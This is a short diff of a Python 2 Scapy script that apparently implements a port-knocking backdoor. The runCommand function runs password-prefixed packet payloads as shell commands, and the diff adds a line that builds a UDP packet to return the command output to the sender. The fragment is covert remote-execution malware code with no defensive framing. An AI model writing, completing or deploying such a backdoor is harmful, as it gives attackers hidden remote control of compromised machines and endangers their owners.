@@ -56,14 +56,13 @@ def knock(packet):
 
 def runCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
-        print packet.show
         data = packet['Raw'].load
         if data.startswith(password):
             data = data[len(password):]
             print "Running command " + data
             output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = password + output.stdout.read() + output.stderr.read()
-            print output
+            packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
 
 def main():
     while state is not 3:
